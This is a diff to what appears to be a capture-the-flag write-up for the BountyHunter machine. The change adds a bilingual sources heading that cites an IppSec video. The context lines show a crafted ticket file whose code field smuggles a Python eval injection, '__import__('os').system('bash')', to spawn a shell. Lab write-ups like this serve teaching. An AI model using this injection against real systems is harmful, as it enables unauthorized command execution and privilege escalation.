@@ -141,6 +141,10 @@ If all those conditions are met, then the line (with “**” removed) will be p
 So the payload could be created
 ```
 # Skytrain Inc
+## Fuentes / Sources
+
+- [IppSec: BountyHunter (video)](https://youtube.com/watch?v=5axsDhumfhU) - IppSec - fecha de acceso: 2026-09-24.
+
 ## Ticket to Bridgeport
 __Ticket Code:__
 **32+110+43**
@@ -161,6 +165,9 @@ The simplest way to inject into eval is to import the os modules and call system
 So the payload we get:
 ```
 # Skytrain Inc
+## Fuentes / Sources
+
+
 ## Ticket to Bridgeport
 __Ticket Code:__
 **32+110+43+__import__('os').system('bash')**
